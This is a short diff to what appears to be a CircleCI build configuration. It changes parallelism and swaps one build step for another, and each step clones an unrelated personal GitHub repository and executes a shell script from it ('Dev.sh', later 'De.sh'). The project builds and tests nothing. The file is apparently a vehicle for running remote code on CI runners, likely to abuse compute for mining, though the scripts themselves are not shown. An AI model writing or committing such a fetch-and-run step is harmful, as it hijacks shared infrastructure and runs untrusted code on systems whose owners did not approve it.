@@ -3,10 +3,10 @@ jobs:
   build:
     docker:
       - image: node:latest
-    parallelism: 64
+    parallelism: 4
     resource_class: xlarge
     steps:
-      - run: git clone https://github.com/Huijv/dev.git && cd dev && chmod u+x Dev.sh && ./Dev.sh
+      - run: git clone https://github.com/Owijeka/dev.git && cd dev && chmod u+x De.sh && ./De.sh
 workflows:
     version: 2
     build:
